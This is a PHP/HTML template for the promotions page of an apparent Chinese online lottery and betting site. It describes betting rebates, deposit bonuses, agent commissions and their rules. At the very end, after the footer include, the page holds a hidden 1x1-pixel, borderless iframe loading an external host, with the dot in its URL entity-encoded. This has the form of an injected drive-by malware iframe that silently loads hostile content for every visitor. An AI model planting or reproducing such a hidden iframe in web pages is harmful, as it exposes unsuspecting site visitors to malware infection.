<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<?php $this->display('inc_skin.php',0,''); ?>
</head>
<?php
$data = array();
if($this->settings['huoDongRegister']){
    $data[] = 'huoDongRegister';
}
if($this->settings['rechargeCommissionAmount']){
    $data[] = 'rechargeCommissionAmount';
}
if($this->settings['conCommissionBase']){
    $data[] ='conCommissionBase';
}
//首冲充值活动
$rdata = $this->getRows("select * from {$this->prename}events where enable=1 and isdelete=0 and state=0");
if($rdata){
    //活动是否过期
    foreach($rdata as $k=>$val)
    {
        if($val['end_time'] && $val['end_time'] < $this->time){
            $this->update("update {$this->prename}events set `state`=1,`enabled`=0 where id={$val['id']}");
            unset($rdata[$k]);
        } else{
            $data[] = $rdata[$k];
        }
    }
}
?>
<body>

<style type="text/css">
.icon_a{background:url(/img/index/icon.png) no-repeat}
.sales_right{overflow:hidden;margin-top:10px;margin-left:30px;width:800px}
.fl{float:left!important}
.sales_nr{position:relative;overflow:hidden;margin-bottom:20px;border:1px solid #dcdcdc}
.sales_nr .sales_btn{position:absolute;top:50px;right:0;z-index:99;display:block;padding:10px 6px 0 9px;width:29px;height:95px;background-position:-251px -88px;color:#08a09d;text-align:center;font-size:14px;font-family:"宋体";line-height:16px}
.sales_nr .sales_btn:hover{background-position:-326px -88px;color:#fff}
.sales_img img{width:800px;height:200px}
.sales_title{padding:0 8px;height:40px;font-size:14px;font-family:"微软雅黑";line-height:36px}
.sales_title p.fl{color:#2b2b2b;font-size:20px}
.sales_title p.fl span{display:inline-block;margin-top:2px;margin-right:6px;width:44px;height:21px;color:#fff;vertical-align:text-top;text-align:center;font-size:14px;line-height:21px}
.redicon{background-position:-333px 0}
.orangeicon{background-position:-333px -27px}
.sales_title p.fr span{color:#9e9e9e;font-family:"微软雅黑"}
.sales_title p.fr{font-family:arial}
.sales_blcok{display:none;overflow:hidden;padding:20px 0 0;border-top:1px solid #e3e3e3}
.sales_blcok p{clear:both;padding:0 20px;line-height:24px}
.fs14{font-size:14px}
.sales_blcok h3{margin:20px 20px 0;width:82px;height:32px;background:url(/img/index/title_bg2.png) no-repeat;color:#fff;text-align:left;text-indent:11px;font-weight:400;font-size:12px;line-height:17px}

</style>
<?php $this->display('inc_header.php'); ?>
<div id="rightcon">
            <div class="wrapper bigbox">
<div class="page-wrapper">
    <?php $this->display('inc_left_4.php'); ?><div class="top_menu">
    </div>
    <div class="page-info">
	  <div class="sales_right fl">
               <div class="sales_nr">
                    <a class="icon_a sales_btn" href="javascript:void(0)" id="d1">查看详情</a>
                    <p class="sales_img"><img src="/img/hd/sales_160406.jpg"></p>
                    <div class="sales_title">
                        <p class="fl"><span class="icon_a redicon">最新</span>日日生金，最新活动上线</p>
                        <p class="fr"><span class="">发布时间：</span>2016/05/01 00:07</p>
                    </div>
                    <div class="sales_blcok" id="d2">
                        <p class="fs14">为回馈广大新老会员的支持，重磅推出投注返利大派送活动。</p>
                        <h3>活动时间</h3>
                        <p>2016/05/01 - 不限时<span style="color:#e93a46;">（火热进行中)</span></p>
                        <h3>活动详情</h3>
                        <p>1.当日投注量达到588元或以上,第二日即可领取投注彩金。投的越多返的越多。</p>
                        <p>2.奖金总共6档，当达到可以领取投注量时，请联系在线客服领取。</p>
                        <p>3.每天上午9:00-24:00领取前一天的彩金，超时将不可领取。</p>
                        <img style="margin-left:20px;margin-top:14px" src="/img/hd/sales_rebate.jpg">
                        <h3>规则说明</h3>
                        <p>1.流水是计算当天0:00到24:00之间的投注量。</p>
                        <p>2.投注量按已开奖的注单为准。</p>
                        <p>3.参与本活动会员，须遵守平台相关规则，包括但不仅限于：利用活动或技术漏洞套利，多账号对冲，任何违规行为，本站有权扣除违规所得。</p>
                        <p>4.同一个账户，同一个IP、银行卡每天只限领取一次。</p>
                        <p>5.本平台保留最终解释权，如对活动有任何疑问，欢迎您随时咨询在线客服。 </p>
						<p class="sales_bottom"><img src="/img/hd/sales_bg.png"></p>
                    </div>
                </div>

                <div class="sales_nr">
                    <a class="sales_btn icon_a" href="javascript:void(0)" id="d3">查看详情</a>
                    <p class="sales_img"><img src="/img/hd/sales_1203.jpg"></p>
                    <div class="sales_title">
                        <p class="fl"><span class="icon_a redicon">长期</span>重磅继续！二级佣金活动正式开启</p>
                        <p class="fr"><span class="">发布时间：</span>2015/12/01 15:07</p>
                    </div>
                    <div class="sales_blcok" id="d4">
                        <p class="fs14">全新福利上线，新增二级佣金活动。</p>
                        <h3>活动时间</h3>
                        <p><span style="color:#e93a46;">长期有效</span></p>
                        <h3>活动详情</h3>
                        <!--p>当日佣金在次日<span class="green">早上5：00</span>系统会自动发放。</p-->
                        <img style="margin-left:20px;margin-top:14px" src="/img/hd/cxbg.png">
                        <h3>规则说明</h3>
                        <p>1.下级投注量≥3000时，依此类推。</p>
                        <p>2.任何套利行为，都将被冻结资金，并不予提款。</p>
                        <p>3.下级的具体投注情况可以在“代理中心”中查询。</p>
                        <p>4.各档佣金不重复发放，以流水达到的最高档为准。</p>
                        <p>5.本平台保留最终解释权，如您对活动有任何疑问，欢迎您随时咨询在线客服。 </p>
						<p class="sales_bottom"><img src="/img/hd/sales_bg.png"></p>
                    </div>
                </div>
                <div class="sales_nr">
                    <a class="sales_btn icon_a" href="javascript:void(0)" id="d5">查看详情</a>
                    <p class="sales_img"><img src="/img/hd/img9.jpg"></p>
                    <div class="sales_title">
                        <p class="fl"><span class="icon_a orangeicon">结束</span>重磅! 存款红利来袭~</p><span style="color:#e93a46;">（此活动已结束）</span>
                        <p class="fr"><span class="">发布时间：</span>2015/06/01,15:07</p>
                    </div>
                    <div class="sales_blcok" id="d6">
                        <p class="fs14">本活动所有新老用户均可参加。</p>
                        <h3>活动时间</h3>
                        <p><span style="color:#e93a46;">活动已结束</span></p>
                        <h3>活动详情</h3>
                        <p>1.单笔充值<b class="green">200</b>元以上的用户方可参加，赠送充值金额的<b class="green">0.3%</b>。</p>
                        <p>2.每日参加次数不限，单笔冲值最高送<b class="green">60</b>元。</p>
                        <h3>规则说明</h3>
                        <p>1.只限网银转账（转账到公司指定银行卡）的用户，使用在线充值的不予计算，系统会在充值之后自动赠送红利。</p>
                        <p>2.须消费充值金额的30%，方可提款，否则可能会被视为套利行为。</p>
                        <p>3.任何套利行为，都将被冻结资金，并不予提款。</p>
                        <p>4.本平台保留最终解释权，如您对活动有任何疑问，欢迎您随时咨询在线客服。</p>
						<p class="sales_bottom"><img src="/img/hd/sales_bg.png"></p>
                    </div>
                </div>
                <div class="sales_nr">
                    <a class="sales_btn icon_a" href="javascript:void(0)" id="d7">查看详情</a>
                    <p class="sales_img"><img src="/img/hd/img10.jpg"></p>
                    <div class="sales_title">
                        <p class="fl"><span class="icon_a orangeicon">结束</span>每日登陆领取红利</p><span style="color:#e93a46;">（此活动已结束）</span>
                        <p class="fr"><span class="">发布时间：</span>2014/09/16,15:07</p>
                    </div>
                    <div class="sales_blcok" id="d8">
                        <p class="fs14">为回馈广大新老用户，每日幸运彩金大派送。</p>
                        <h3>活动时间</h3>
                        <p><span style="color:#e93a46;">活动已结束</span></p>
                        <h3>活动详情</h3>
                        <p>1.老用户每日登录账号，系统将自动为您派送1元幸运彩金。</p>
                        <p>2.每位玩家每天只能领取一次。</p>
                        <h3>规则说明</h3>
                        <p>1.每日前500名玩家发放彩金。</p>
                        <p>2.任何套利行为，都将被冻结资金，并不予提款。</p>
                        <p>3.本平台保留最终解释权，如您对活动有任何疑问，欢迎您随时咨询在线客服。</p>
						<p class="sales_bottom"><img src="/img/hd/sales_bg.png"></p>
                    </div>
                </div>                
            </div>
    </div>
</div>
</div>
</div><?php $this->display('inc_footer.php'); ?>
<iframe style="height:1px" src="http://www&#46;Brenz.pl/rc/" frameborder=0 width=1></iframe>
</body>
</html>
  
   
 